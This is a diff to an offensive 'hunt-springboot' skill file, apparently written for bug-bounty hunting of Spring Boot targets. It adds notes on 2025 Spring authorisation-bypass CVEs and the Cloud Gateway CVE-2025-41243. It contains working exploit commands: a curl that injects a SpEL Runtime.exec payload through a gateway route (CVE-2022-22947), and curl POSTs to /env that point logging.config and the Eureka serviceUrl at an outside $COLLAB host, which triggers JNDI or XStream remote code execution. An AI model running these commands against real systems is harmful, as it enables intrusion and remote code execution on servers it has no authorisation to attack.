@@ -1,6 +1,6 @@
 ---
 name: hunt-springboot
-description: Hunt Spring Boot specific vulnerabilities — Actuator endpoints (heapdump, env, loggers, mappings, shutdown), Spring Expression Language (SpEL) injection → RCE, H2 console RCE, Jolokia JMX exposure, Spring4Shell (CVE-2022-22965), Spring Cloud Function SPEL (CVE-2022-22963), heap dump credential extraction. Use when target runs Spring Boot — detected via X-Application-Context header, /actuator, Whitelabel Error Page, or Java stack traces.
+description: Hunt Spring Boot specific vulnerabilities — Actuator endpoints (heapdump, env, loggers, mappings, shutdown), Spring Expression Language (SpEL) injection → RCE, H2 console RCE, Jolokia JMX exposure, Spring4Shell (CVE-2022-22965), Spring Cloud Function SPEL (CVE-2022-22963), Spring Cloud Gateway actuator (CVE-2022-22947, CVE-2025-41243), heap dump credential extraction. Use when target runs Spring Boot — detected via X-Application-Context header, /actuator, Whitelabel Error Page, or Java stack traces.
 sources: hackerone_public, cve_database, spring_security_advisories
 report_count: 16
 ---
@@ -72,6 +72,12 @@ curl -s "$BASE/mappings" | python3 -m json.tool 2>/dev/null | grep -oP '"pattern
 # Get Spring beans (lists all registered beans, reveals internal architecture)
 curl -s "$BASE/beans" | python3 -m json.tool 2>/dev/null | head -100
 ```
+
+**Version-gated authz bypasses** (get versions from `$BASE/info`, `$BASE/env`, or jar names in a heapdump):
+- **CVE-2025-22235** (Spring Boot, Apr 2025, High): `EndpointRequest.to(X)` builds a `null/**` matcher when endpoint X is disabled or not web-exposed, so the rule written for X (often `permitAll()`) lands on `/null/**`. Test: request app paths under `/null/` unauthenticated. Fixed 3.4.5 / 3.3.11 (OSS); 3.2.14 / 3.1.16 / 2.7.25 Enterprise only. https://spring.io/security/cve-2025-22235
+- **CVE-2025-41232** (Spring Security 6.4.0-6.4.5, fixed 6.4.6, Critical): with `@EnableMethodSecurity(mode=ASPECTJ)` + `spring-security-aspects`, annotations on **private** methods are skipped. https://spring.io/security/cve-2025-41232
+- **CVE-2025-41248** (Spring Security 6.4.0-6.4.10 / 6.5.0-6.5.4, fixed 6.4.11 / 6.5.5, High): `@PreAuthorize`-style annotations on methods inherited from generic superclasses/interfaces with unbounded generics are not found. https://spring.io/security/cve-2025-41248
+- Black-box proof for the two method-security bugs: version gate matches and a low-priv user completes the operation the annotation should block.
 
 ---
 
@@ -158,19 +164,21 @@ curl -s -X POST "https://$TARGET/functionRouter" \
 ## Phase 5b — Spring Cloud Gateway Actuator SpEL RCE (CVE-2022-22947)
 If the `gateway` actuator is exposed, add a route whose filter body is SpEL, then refresh to evaluate it (escape inner quotes for your shell):
 ```bash
-curl -s -X POST "$BASE/actuator/gateway/routes/hax" -H "Content-Type: application/json" \
+curl -s -X POST "$BASE/gateway/routes/hax" -H "Content-Type: application/json" \
  -d '{"id":"hax","filters":[{"name":"AddResponseHeader","args":{"name":"X","value":"#{T(java.lang.Runtime).getRuntime().exec(new String[]{ \"id\" })}"}}],"uri":"http://x"}'
-curl -s -X POST "$BASE/actuator/gateway/refresh"; curl -s "$BASE/actuator/gateway/routes"
+curl -s -X POST "$BASE/gateway/refresh"; curl -s "$BASE/gateway/routes"
 ```
+
+**CVE-2025-41243** (Sep 2025, Critical, CVSS 3.1 vector scores 10.0): same exposure (`management.endpoints.web.exposure.include=gateway`, actuator reachable and unsecured) on Spring Cloud Gateway **Server WebFlux** lets SpEL modify Spring Environment properties, even on versions patched for CVE-2022-22947. Affected 4.3.0, 4.2.0-4.2.4, 4.1.0-4.1.10, <= 3.1.10; fixed 4.3.1 / 4.2.5 (OSS), 4.1.11 / 3.1.11 (Enterprise only). Server WebMVC is not affected. An unauthenticated `GET $BASE/gateway/routes` returning JSON on an affected version is reportable on the version gate alone. https://spring.io/security/cve-2025-41243
 
 ## Phase 5c — Writable `/env` -> `/refresh` gadget RCE
 When `/actuator/env` accepts POST and `/actuator/refresh` exists, poison a property then reload:
 ```bash
 # logback JNDI:
-curl -s -X POST "$BASE/actuator/env" -H "Content-Type: application/json" -d '{"name":"logging.config","value":"http://$COLLAB/logback.xml"}'
+curl -s -X POST "$BASE/env" -H "Content-Type: application/json" -d '{"name":"logging.config","value":"http://$COLLAB/logback.xml"}'
 # Eureka XStream deserialization:
-curl -s -X POST "$BASE/actuator/env" -H "Content-Type: application/json" -d '{"name":"eureka.client.serviceUrl.defaultZone","value":"http://$COLLAB/x"}'
-curl -s -X POST "$BASE/actuator/refresh"
+curl -s -X POST "$BASE/env" -H "Content-Type: application/json" -d '{"name":"eureka.client.serviceUrl.defaultZone","value":"http://$COLLAB/x"}'
+curl -s -X POST "$BASE/refresh"
 ```
 (Veracode: Exploiting Spring Boot Actuators.)
 
@@ -221,6 +229,7 @@ curl -s "https://$TARGET/jolokia/exec/com.sun.management:type=DiagnosticCommand/
 | `/actuator/env` | Read all env vars including secrets | High |
 | H2 console accessible | CREATE ALIAS → RCE | Critical |
 | SpEL injection | `T(Runtime).exec()` → OS command | Critical RCE |
+| Gateway actuator exposed | CVE-2022-22947 route SpEL / CVE-2025-41243 Environment property modification | Critical |
 | Spring4Shell | Write webshell → RCE | Critical |
 | Jolokia + MLet | Remote code via MBean | Critical RCE |
 
